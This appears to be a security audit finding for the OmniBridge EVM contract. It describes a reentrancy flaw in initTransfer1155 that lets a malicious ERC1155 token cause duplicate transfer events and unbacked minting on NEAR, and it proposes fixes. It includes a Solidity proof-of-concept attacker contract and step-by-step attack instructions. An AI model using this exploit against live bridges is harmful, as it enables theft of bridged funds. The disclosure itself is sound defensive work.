Audit Report

## Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 `safeTransferFrom` Enables Unauthorized Token Minting on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` before an external call to an attacker-controlled ERC1155 contract, but reads `currentOriginNonce` from storage again after that call when emitting `InitTransfer` and calling `initTransferExtension`. Because the contract has no reentrancy guard, a malicious ERC1155 can re-enter `initTransfer1155` during `safeTransferFrom`, increment the nonce a second time, and cause both the inner and outer frames to emit `InitTransfer` events carrying the same nonce value while locking zero tokens on EVM — enabling unauthorized minting on NEAR.

## Finding Description

`OmniBridge` imports no `ReentrancyGuard` and applies no `nonReentrant` modifier to any function; a grep across all EVM contracts confirms zero occurrences of either.

In `initTransfer1155`:

```
currentOriginNonce += 1;                                    // line 448 — nonce = N
...
IERC1155(tokenAddress).safeTransferFrom(                    // line 458 — external call to attacker contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...);        // line 471 — re-reads storage
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...);// line 483 — re-reads storage
```

The nonce is never cached into a local variable. Both `initTransferExtension` and the `emit` statement read `currentOriginNonce` from storage at the moment they execute, after the external call has returned. A re-entrant call that increments the nonce again corrupts the value seen by the outer frame.

`logMetadata1155` (lines 234–270) is fully permissionless — any caller can register any `(tokenAddress, tokenId)` pair with no access control. `initTransfer1155` performs no whitelist check on `tokenAddress`.

**Reentrancy execution trace (nativeFee = 0):**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0 → **1** | `currentOriginNonce += 1` |
| Outer hits `safeTransferFrom` | 1 | Malicious ERC1155 re-enters `initTransfer1155` |
| Inner call enters | 1 → **2** | `currentOriginNonce += 1` |
| Inner hits `safeTransferFrom` | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Inner emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |
| Outer `safeTransferFrom` returns | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Outer emits event | 2 | `InitTransfer(nonce=2)` — zero tokens locked |

Nonce 1 is permanently consumed but never emitted. Two `InitTransfer` events with nonce 2 are emitted; the bridge holds zero ERC1155 tokens.

This directly violates the documented invariant in `evm/CLAUDE.md`: *"Event–transfer atomicity: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held."*

It also violates the stated reentrancy defense: *"State before external calls: Always mutate state (e.g. mark nonce used) before any external call."* The nonce is incremented before the call but read after it, making the post-call read vulnerable to corruption.

## Impact Explanation

The NEAR side (via light-client proof or Wormhole VAA) observes a valid on-chain `InitTransfer` event for nonce 2 and mints the corresponding bridged tokens to the attacker's NEAR address. The second duplicate nonce-2 event is rejected by NEAR as already finalized. The attacker receives one full mint with zero ERC1155 tokens locked on EVM. This is **unauthorized minting / theft of bridged funds**: tokens are created on NEAR with no corresponding collateral held by the bridge — a concrete Critical impact matching "unauthorized minting of bridged funds."

## Likelihood Explanation

The attack is fully permissionless and requires no privileged role, no leaked key, no validator collusion, and no front-running:

1. Deploy a malicious ERC1155 contract (no admin approval required).
2. Call `logMetadata1155(maliciousERC1155, tokenId)` — no access control.
3. Wait for the NEAR relayer to index the `LogMetadata` event (seconds to minutes, automatic).
4. Call `initTransfer1155` with `nativeFee = 0` and the malicious ERC1155 address.

The attack is repeatable: each invocation consumes two nonces (one silently skipped, one duplicated) and produces one free mint.

## Recommendation

1. **Add `ReentrancyGuard`**: Import OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to both `initTransfer` and `initTransfer1155`.

2. **Cache the nonce locally**: Read `currentOriginNonce` into a stack variable immediately after incrementing and use only that variable for all subsequent references within the function:

```solidity
function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 originNonce = currentOriginNonce; // cache — immune to re-entrant mutation
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., originNonce, ...);
    emit BridgeTypes.InitTransfer(..., originNonce, ...);
}
```

Apply the same local-cache fix to `initTransfer` (lines 381, 418, 430), which has the same pattern.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MaliciousERC1155 {
    address public bridge;
    bool private _reentered;

    constructor(address bridge_) { bridge = bridge_; }

    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!_reentered) {
            _reentered = true;
            // Re-enter; msg.sender is the bridge, nativeFee=0 so no ETH needed
            IOmniBridge(bridge).initTransfer1155(
                address(this), tokenId, uint128(amount),
                0, 0, "near:attacker.near", ""
            );
            // Return without transferring any tokens — no revert
        }
        // Inner frame: also return without transferring tokens
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack sequence:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(address(malicious), tokenId)   // permissionless
// 3. Wait for NEAR relayer to index LogMetadata
// 4. bridge.initTransfer1155(address(malicious), tokenId, amount, 0, 0, "near:attacker.near", "")
//    → Two InitTransfer events emitted with nonce=N+1, zero tokens locked
//    → NEAR mints `amount` tokens to attacker.near for free
```

A Foundry invariant test asserting `bridge.balanceOf(token, id) >= sum_of_emitted_amounts` would catch this immediately on the first re-entrant call.